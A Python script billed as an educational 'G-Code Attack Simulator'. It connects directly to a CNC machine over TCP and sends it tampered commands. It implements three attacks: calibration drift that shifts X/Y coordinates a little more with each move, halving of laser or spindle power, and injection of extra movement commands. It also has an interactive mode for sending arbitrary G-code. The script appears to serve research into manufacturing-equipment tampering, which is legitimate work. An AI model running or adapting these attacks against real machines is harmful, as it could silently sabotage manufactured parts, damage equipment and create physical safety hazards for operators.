#!/usr/bin/env python3
"""
Direct Attack Simulator - Test attacks by connecting directly to CNC
This simulates what would happen if you were intercepting
Save as: attack_simulator.py
Run as: python3 attack_simulator.py
"""

import socket
import time
import re
from datetime import datetime

class GCodeAttackSimulator:
    def __init__(self, cnc_ip="192.168.0.170", cnc_port=8080):
        self.cnc_ip = cnc_ip
        self.cnc_port = cnc_port
        self.sock = None
        self.command_history = []
        
    def connect(self):
        """Connect to CNC"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((self.cnc_ip, self.cnc_port))
            print(f"[+] Connected to CNC at {self.cnc_ip}:{self.cnc_port}")
            
            # Get initial status
            self.send_command("?")
            return True
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return False
    
    def send_command(self, cmd):
        """Send command and get response"""
        if not self.sock:
            print("[!] Not connected")
            return None
            
        try:
            self.sock.send((cmd + "\n").encode())
            time.sleep(0.1)  # Give CNC time to respond
            response = self.sock.recv(1024).decode('utf-8', errors='ignore').strip()
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] Sent: {cmd}")
            print(f"[{timestamp}] Recv: {response}")
            
            self.command_history.append((cmd, response))
            return response
            
        except Exception as e:
            print(f"[!] Send error: {e}")
            return None
    
    def simulate_calibration_drift(self):
        """Simulate calibration drift attack"""
        print("\n" + "="*60)
        print("ATTACK SIMULATION: Calibration Drift")
        print("="*60)
        print("This simulates gradually increasing position errors")
        print("In a real attack, this would be applied to intercepted commands")
        
        drift = 0.0
        drift_increment = 0.1
        
        test_commands = [
            "G90",  # Absolute positioning
            "G1 F1000",  # Set feed rate
            "G1 X10 Y10",
            "G1 X20 Y10",
            "G1 X20 Y20",
            "G1 X10 Y20",
            "G1 X10 Y10"
        ]
        
        print("\n[*] Original commands:")
        for cmd in test_commands:
            if "X" in cmd or "Y" in cmd:
                print(f"    {cmd}")
        
        print("\n[*] Modified commands with drift:")
        for cmd in test_commands:
            modified = cmd
            
            # Apply drift to X and Y coordinates
            if "X" in cmd or "Y" in cmd:
                for axis in ['X', 'Y']:
                    match = re.search(f'{axis}([\\-\\d.]+)', cmd)
                    if match:
                        original = float(match.group(1))
                        drifted = original + drift
                        modified = modified.replace(
                            f'{axis}{original}',
                            f'{axis}{drifted:.2f}'
                        )
                
                print(f"    {modified} (drift: +{drift:.2f}mm)")
                drift += drift_increment
            
            # Send modified command
            self.send_command(modified)
            time.sleep(0.5)
        
        print(f"\n[*] Total drift applied: {drift:.2f}mm")
        
    def simulate_power_reduction(self):
        """Simulate laser/spindle power reduction attack"""
        print("\n" + "="*60)
        print("ATTACK SIMULATION: Power Reduction")
        print("="*60)
        print("This simulates reducing laser/spindle power")
        
        test_commands = [
            "M3 S800",  # Original: full power
            "G1 X30 Y30 F1000",
            "M5"  # Laser off
        ]
        
        reduction_factor = 0.5  # Reduce to 50%
        
        for cmd in test_commands:
            modified = cmd
            
            # Check for spindle/laser power command
            match = re.search(r'S(\d+)', cmd)
            if match:
                original_power = int(match.group(1))
                reduced_power = int(original_power * reduction_factor)
                modified = modified.replace(
                    f'S{original_power}',
                    f'S{reduced_power}'
                )
                print(f"[ATTACK] Power reduced: S{original_power} -> S{reduced_power}")
            
            self.send_command(modified)
            time.sleep(0.5)
    
    def simulate_command_injection(self):
        """Simulate injecting malicious commands"""
        print("\n" + "="*60)
        print("ATTACK SIMULATION: Command Injection")
        print("="*60)
        print("This simulates injecting extra commands")
        
        print("\n[*] Normal command sequence:")
        normal_commands = [
            "G1 X40 Y40 F1000",
            "G1 X40 Y40",
            "G1 X40 Y40",
            "G1 X40 Y40"
        ]
        
        for cmd in normal_commands:
            print(f"    {cmd}")
        
        print("\n[*] With injected commands:")
        for cmd in normal_commands:
            # Send original
            self.send_command(cmd)
            
            # Inject malicious command after each legitimate one
            injected = "G1 Y5"  
            print(f"[INJECTED] {injected}")
            self.send_command(injected)
            
            time.sleep(0.5)
    
    def monitor_mode(self):
        """Just monitor CNC status"""
        print("\n[*] Monitor mode - checking CNC status every 2 seconds")
        print("    Press Ctrl+C to stop")
        
        try:
            while True:
                response = self.send_command("?")
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[*] Monitoring stopped")
    
    def interactive_mode(self):
        """Interactive command mode"""
        print("\n[*] Interactive mode - type commands or 'help' for options")
        
        while True:
            try:
                cmd = input("\ngcode> ").strip()
                
                if cmd.lower() == 'quit':
                    break
                elif cmd.lower() == 'help':
                    print("Commands:")
                    print("  ? - Get status")
                    print("  $$ - Get settings")
                    print("  G28 - Home")
                    print("  G1 X10 Y10 F1000 - Move")
                    print("  M3 S500 - Laser/spindle on")
                    print("  M5 - Laser/spindle off")
                    print("  attack1 - Simulate drift attack")
                    print("  attack2 - Simulate power attack")
                    print("  attack3 - Simulate injection")
                    print("  history - Show command history")
                    print("  quit - Exit")
                elif cmd == 'attack1':
                    self.simulate_calibration_drift()
                elif cmd == 'attack2':
                    self.simulate_power_reduction()
                elif cmd == 'attack3':
                    self.simulate_command_injection()
                elif cmd == 'history':
                    print("\nCommand History:")
                    for sent, recv in self.command_history[-10:]:
                        print(f"  > {sent}")
                        print(f"  < {recv}")
                elif cmd:
                    self.send_command(cmd)
                    
            except KeyboardInterrupt:
                print("\n[*] Use 'quit' to exit")
            except Exception as e:
                print(f"[!] Error: {e}")
    
    def close(self):
        """Close connection"""
        if self.sock:
            self.sock.close()
            print("[*] Connection closed")

def main():
    print("="*60)
    print("G-Code Attack Simulator")
    print("Educational Testing Tool")
    print("="*60)
    print("\n⚠️  WARNING: This sends real commands to your CNC!")
    print("Make sure laser/spindle is OFF or in safe mode!\n")
    
    simulator = GCodeAttackSimulator()
    
    if not simulator.connect():
        print("[!] Failed to connect to CNC")
        return
    
    print("\nOptions:")
    print("1. Interactive mode (send custom commands)")
    print("2. Monitor mode (watch status)")
    print("3. Attack simulation - Calibration drift")
    print("4. Attack simulation - Power reduction")
    print("5. Attack simulation - Command injection")
    print("6. Run all attack simulations")
    
    choice = input("\nSelect option [1]: ").strip() or "1"
    
    try:
        if choice == "1":
            simulator.interactive_mode()
        elif choice == "2":
            simulator.monitor_mode()
        elif choice == "3":
            simulator.simulate_calibration_drift()
        elif choice == "4":
            simulator.simulate_power_reduction()
        elif choice == "5":
            simulator.simulate_command_injection()
        elif choice == "6":
            print("\n[*] Running all attack simulations...")
            simulator.simulate_calibration_drift()
            time.sleep(2)
            simulator.simulate_power_reduction()
            time.sleep(2)
            simulator.simulate_command_injection()
            print("\n[*] All simulations complete")
    finally:
        simulator.close()

if __name__ == "__main__":
    main()
